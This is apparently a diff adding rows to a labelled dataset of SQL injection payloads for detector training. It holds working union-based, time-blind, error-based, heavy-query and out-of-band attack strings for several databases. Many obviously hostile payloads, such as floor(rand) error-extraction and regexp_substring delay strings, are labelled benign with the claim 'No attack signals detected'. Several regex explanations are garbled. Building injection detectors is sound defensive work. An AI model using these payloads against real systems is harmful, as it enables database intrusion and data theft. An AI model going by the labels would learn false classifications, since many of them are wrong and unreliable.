+24688,"-9758'+ ( select 'rlcy' where 3691 = 3691 union all select 3691,3691,3691,3691,3691,3691,3691--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24689,"-4473' ) union all select 7656,7656#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24690,-8922 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- krmh,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24691,"1' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'amjh' = 'amjh",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24692,"1' ) where 6774 = 6774 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24693,"1"" ) where 6255 = 6255 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
+24694,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'xcxr' like 'xcxr",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
+24695,"1'+ ( select 'yfrs' where 4388 = 4388 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24696,-9522 ) as lraw where 9472 = 9472 or ( 4087 = 8213 ) *8213--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24697,"1%"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
+24698,"1"" ) where 5828 = 5828 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
+24699,select sleep ( 5 ) and 'hhrw' like 'hhrw,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24700,1 ) ) as nwyh where 7100 = 7100,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24701,"-1339 ) ) ) union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24702,1'+ ( select 'dhcv' where 9372 = 9372,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24703,-8453 ) ) ) or 3038 = 3038,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24704,1' ) where 8274 = 8274,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24705,"1"" ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""rwlq"" = ""rwlq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24706,"1"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ""tvla"" = ""tvla",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24707,"-3116 ) ) as jyiq where 3875 = 3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24708,"1' where 4701 = 4701 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24709,"1"" ) ) as etap where 8506 = 8506 union all select null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24710,"1 ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 3872 = 3872",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24711,"1"" ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""hbfr"" like ""hbfr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24712,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'wwwb' = 'wwwb",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24713,"1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'maln' like 'maln",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24714,"1%"" ) and elt ( 4249 = 4249,7259 ) and ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24715,1 ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 6518 = 6518,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
+24716,"1"" ) where 1705 = 1705",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24717,1' in boolean mode ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24718,"1"" ) ) as dvpb where 6673 = 6673",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24719,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) # idxq",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
+24720,1 ) union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24721,"1%"" ) and sleep ( 5 ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24722,"1"" where 5977 = 5977",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24723,"-4340 ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 8505 = 8505",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24724,1'+ ( select 'drqj' where 1246 = 1246,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24725,1%' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24726,"1"" ) ) as uqem where 3521 = 3521",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24727,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'pjrf' = 'pjrf",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
+24728,1' ) and 5999 = 5879,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24729,"-9601' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24730,-2793' ) where 2621 = 2621 union all select 2621#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24731,1 union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24732,select case when 1802 = 7063 then 1 else null end--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24733,"-6680%"" ) ) union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24734,"1 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) -- fzhj",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24735,1'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24736,"-5624' union all select 3723,3723,3723,3723,3723--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24737,"-9371' ) union all select 5900,5900,5900#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
+24738,"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""krtr"" like ""krtr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24739,"1%' ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
+24740,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'ugrk' = 'ugrk,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
+24741,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'nhuk' = 'nhuk",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24742,"1, ( select ( case when ( 5885 = 1825 ) then 1 else 5885* ( select 5885 from master..sysdatabases ) end ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
+24743,"1 ) as lhie where 4631 = 4631 union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
